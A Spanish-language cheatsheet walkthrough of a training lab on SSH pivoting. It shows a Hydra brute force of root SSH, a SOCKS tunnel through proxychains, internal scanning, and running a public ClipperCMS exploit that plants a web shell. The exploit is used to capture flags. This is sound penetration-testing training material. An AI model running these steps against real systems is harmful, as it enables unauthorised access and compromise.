
# Pivoting con SSH Tunneling

{% content-ref url="/pages/f4WB2e3r7MK57VXZ4PxN" %}
[Remote/Reverse Port Forwarding con SSH](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-hosts/pivoting-tunelling-y-port-forwarding/remote-reverse-port-forwarding-con-ssh.md)
{% endcontent-ref %}

## <mark style="color:purple;">Lab: Pivoting</mark> <mark style="color:purple;"></mark><mark style="color:purple;">**VI**</mark>

En este desafío de pivoting, la arquitectura de red es la que se muestra a continuación:

`Kali` -----------> `Objetivo A` -------------> `Objetivo B`

Tu misión es conseguir las flags presentes tanto en el Objetivo A como en el Objetivo B.

&#x20;El Objetivo A debe ser accesible en **demo.ine.local**.

#### ¿Cómo se resuelve esto?

* Metasploit está instalado en la instancia de Kali a la que tendrás acceso.
* Toda explotación puede realizarse utilizando Metasploit y Proxychains con scripts/herramientas de terceros.
* Puedes utilizar otras herramientas además de Nmap para la enumeración.
* Diccionario de contraseñas: /usr/share/seclists/Passwords/Leaked-Databases/rockyou-40.txt

### Hosts

Sólamente tenemos un objetivo: `demo.ine.local`

```bash
┌──(root㉿INE)-[~]
└─# cat /etc/hosts

127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.1.0.11       INE
127.0.0.1 AttackDefense-Kali
192.215.59.2    INE
192.215.59.2 INE
192.215.59.3 demo.ine.local
```

### Escaneo de puertos

```bash
┌──(root㉿INE)-[~]
└─# nmap -sV demo.ine.local

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
MAC Address: 02:42:C0:D7:3B:03 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

En el objetivo vemos que únicamente está presente el servicio SSH.

### Bruteforce de SSH

```bash
┌──(root㉿INE)-[~]
└─# hydra -l root -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-40.txt 192.215.59.3 ssh

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-04-14 18:21:26
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 3957 login tries (l:1/p:3957), ~248 tries per task
[DATA] attacking ssh://192.215.59.3:22/
[22][ssh] host: 192.215.59.3   login: root   password: 1234567890
1 of 1 target successfully completed, 1 valid password found
```

Bingo! Obtenemos la contraseña del usuario root!

### Acceso SSH

```bash
┌──(root㉿INE)-[~]
└─# ssh root@demo.ine.local
                                                                                                                                  
The authenticity of host 'demo.ine.local (192.215.59.3)' can't be established.
ED25519 key fingerprint is SHA256:Dren9CMZI/JLb2zxmQ2Ph7UHAxZe8Xxap/pWFICnWQs.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'demo.ine.local' (ED25519) to the list of known hosts.

root@demo.ine.local's password: 
Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 6.8.0-40-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

root@demo:~# whoami
root
```

### Flag 1

```bash
root@demo:~# ls
flag.txt  start.sh

root@demo:~# cat flag.txt 
f9a32da38bf9fba2b6c7f7b7********
```

### Ver redes internas

```bash
root@demo:~# ifconfig

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.215.59.3  netmask 255.255.255.0  broadcast 192.215.59.255
        ether 02:42:c0:d7:3b:03  txqueuelen 0  (Ethernet)
        RX packets 1492  bytes 117679 (117.6 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1438  bytes 119196 (119.1 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.253.64.2  netmask 255.255.255.0  broadcast 192.253.64.255
        ether 02:42:c0:fd:40:02  txqueuelen 0  (Ethernet)
        RX packets 18  bytes 1532 (1.5 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Observamos la red interna `192.253.64.0/24` a la que no teníamos acceso desde el exterior.

No tenemos ping instalado en la máquina para comprobar la conectividad con otros posibles hosts internos, pero podemos asumir que la máquina objetivo está en la siguiente IP lógica `192.253.64.3`:

```bash
root@demo:~# ping 192.253.64.3
-bash: ping: command not found
```

### Port Forwarding SSH

{% hint style="info" %}
Usaremos el puerto `9050` porque es el puerto por defecto de Proxychains
{% endhint %}

```bash
┌──(root㉿INE)-[~]
└─# ssh root@demo.ine.local -D 9050
```

#### Confirmación

Observamos que está habilitado por el puerto 9050:

```bash
┌──(root㉿INE)-[~]
└─# netstat -tpln
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:4822          0.0.0.0:*               LISTEN      41/guacd            
tcp        0      0 127.0.0.11:38117        0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:9050          0.0.0.0:*               LISTEN      11194/ssh 
```

### Escaneo de puertos interno

```bash
┌──(root㉿INE)-[~]
└─# proxychains nmap -sT -Pn 192.253.64.3

PORT     STATE SERVICE
80/tcp   open  http
3306/tcp open  mysql
```

Tenemos abiertos los puertos 80 HTYP y 3306 MySQL.

### Enumeración web

```bash
┌──(root㉿INE)-[~]
└─# proxychains curl http://192.253.64.3           
                                                                          
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  192.253.64.3:80  ...  OK
<meta http-equiv="refresh"
   content="0; url=/clipper/manager">
```

Tenemos la aplicación vulnerable `Clipper CMS Manager` que vimos en la sección anterior.

### Búsqueda de exploits

Encontramos un exploit de RCE:

```bash
┌──(root㉿INE)-[~]
└─# searchsploit Clipper CMS                                                                                        
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
ClipperCMS 1.3.0 - Code Execution                                                 | php/remote/38730.py
ClipperCMS 1.3.0 - Multiple SQL Injections                                        | php/webapps/38729.txt
ClipperCMS 1.3.3 - Cross-Site Request Forgery (File Upload)                       | php/webapps/45839.txt
ClipperCMS 1.3.3 - Cross-Site Scripting                                           | php/webapps/44775.txt
---------------------------------------------------------------------------------- ---------------------------------
```

Y nos los descargamos con:

```bash
┌──(root㉿INE)-[~]
└─# searchsploit -m 38730
                                                                                      
  Exploit: ClipperCMS 1.3.0 - Code Execution
      URL: https://www.exploit-db.com/exploits/38730
     Path: /usr/share/exploitdb/exploits/php/remote/38730.py
    Codes: OSVDB-130415
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /root/38730.py
```

### Explotación de Clipper CMS

```bash
┌──(root㉿INE)-[~]
└─# python3 38730.py                                                                                                
usage: python 38730.py http://example.com/ClipperCMS/ admin admin
```

```bash
┌──(root㉿INE)-[~]
└─# proxychains python2 38730.py http://192.253.64.3/clipper/ admin password
                                                         
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  192.253.64.3:80  ...  OK
successful: login as admin
successful: user is allowed to use file manager. Full path: /app/clipper/
successful: .htaccess upload
successful: shell upload. Execute commands via http://192.253.64.3/clipper/404.png?x=<COMMAND>
successful: shell seems to be working
enter command, or enter exit to quit.

$ whoami
www-data

$ hostname
demo2.ine.local
```

Estamos dentro, pero es una shell restrictiva donde no podemos movernos libremente con `cd`.

### Flag 2

La buscaremos para leerla directamente:

```bash
find / -name "*flag*" -type f 2>/dev/null

/usr/bin/flag1.txt
```

```bash
$ cat /usr/bin/flag1.txt
c46dd76701afd376d12f3340********
```
